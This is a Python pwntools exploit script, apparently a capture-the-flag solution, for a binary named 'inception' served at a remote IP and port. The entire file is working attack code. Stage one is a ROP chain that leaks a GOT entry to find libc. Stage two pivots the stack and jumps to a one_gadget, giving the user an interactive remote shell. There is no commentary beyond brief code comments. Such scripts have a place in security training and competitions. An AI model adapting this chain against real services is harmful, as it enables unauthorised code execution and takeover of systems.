from pwn import *
import time
import os

context.binary = "./inception"
context.terminal = ['gnome-terminal', '--tab', '-e']

debugging = False
local = False
pid = 0x00
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}

if local:
    os.system("killall inception")
    #time.sleep(1)
    io = process('./inception')  
    print sorted(pwnlib.util.proc.pid_by_name('inception'))
    parrent_pid, child_pid = sorted(pwnlib.util.proc.pid_by_name('inception'))[-2:]
    print parrent_pid, child_pid
else:
    io = remote('37.139.17.37', 1338)



def make_break_str(blist):
    return "".join([ "b *{}\n".format(hex(i)) for i in blist])

child_breaks = [
    0x400B95,
    0x0000000000400C23,
    0x0000000000400C7A,
    0x400b56
]

parrent_breaks = [
    0x400B95,
    0x0000000000400C51
]

print make_break_str(child_breaks)

if debugging and local:
    # Attach to parrent
    gdb.attach(parrent_pid, """
    set disable-randomization off
	""" + make_break_str(parrent_breaks) + 'c')
    # Attach to child
    gdb.attach(child_pid, """
    set disable-randomization off
	""" +  make_break_str(child_breaks) + 'c')

magic_str = "ASIS{N0T_R34LLY_4_FL4G}\x00"

write_got = p64(0x0000000000602030)
write_plt = p64(0x0000000000400890)



pop_rsi_r15 = p64(0x0000000000400cf1)
pop_rdi = p64(0x0000000000400cf3)

new_buffer = p64(0x602060)

new_rbp = p64(0x602060+32)

payload = ""
payload += magic_str
payload += "A" * 8
payload += new_rbp
# leak got to stdout
payload += pop_rsi_r15
payload += write_got
payload += p64(0)
payload += write_plt
payload += p64(0x400BB7) # read new payload on new rbp so we can do stack pivoting
payload += "C" * (0x100 - len(payload))

print ""
log.info("Sending stage 1 payload")
io.send(payload)

print io.recvuntil("Let's do something: Yeah tha")

write_local_offset = 0xf7b40
write_remote_offset = 0x110140

write_libc_addr =  u64(io.recvn(8))

write_offset = write_local_offset if local else write_remote_offset

libc_base = write_libc_addr - write_offset

log.info("Found write address at: " + hex(write_libc_addr))
log.info("Libc loaded at: " + hex(libc_base))


pop_rdx_off_local = 0x1b92
pop_rdx_off_remote = 0x1b96

one_gadget_local = 0xf07a1
one_gadget_remote = 0x4f322

magic = "TRANSMISSION_OVER\x00"


pop_rdx =  pop_rdx_off_local if local else pop_rdx_off_remote
one_gadget = one_gadget_local if local else one_gadget_remote

#stage2
payload = ""
payload = p64(0x0000000000400b55) # addr of leave, ret to pivot stack
payload += "\x00" * 32
payload += pop_rsi_r15
payload += p64(0x6020c8)
payload += p64(0xdeadbeefdeadbeef)
payload += pop_rdi
payload += p64(6)
payload += p64(libc_base + pop_rdx)
payload += p64(0x100)
payload += write_plt
payload += magic + "\x00" * (40 - len(magic))
payload += p64( libc_base + one_gadget) # one_gadget xD :)
payload += "\x00" * (0x100 - len(payload))

log.info("Sending stage 2 payload.")
io.send(payload)

log.info("Enjoy shell.")
io.interactive()